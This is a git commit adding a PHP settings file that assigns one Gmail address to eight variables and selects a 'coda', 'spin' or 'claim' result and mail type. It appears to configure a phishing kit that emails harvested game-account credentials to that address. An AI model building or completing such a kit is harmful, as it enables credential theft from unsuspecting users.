53e3f3171ee51d7c71d92cda8b97035c9727a0bf
cepz <yosepsaepuloh2008@gmail.com>
2024-09-26 22:26:19 +0700

    Add files via upload

---
+++ setting.php
@@ -0,0 +1,12 @@
+<?php
+$email1 = 'yosepsaepuloh2008@gmail.com';
+$email2 = 'yosepsaepuloh2008@gmail.com';
+$email3 = 'yosepsaepuloh2008@gmail.com';
+$email4 = 'yosepsaepuloh2008@gmail.com';
+$email5 = 'yosepsaepuloh2008@gmail.com';
+$email6 = 'yosepsaepuloh2008@gmail.com';
+$email7 = 'yosepsaepuloh2008@gmail.com';
+$email8 = 'yosepsaepuloh2008@gmail.com';
+$jenisress = $coda; //$coda, $spin, $claim
+$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
+?>
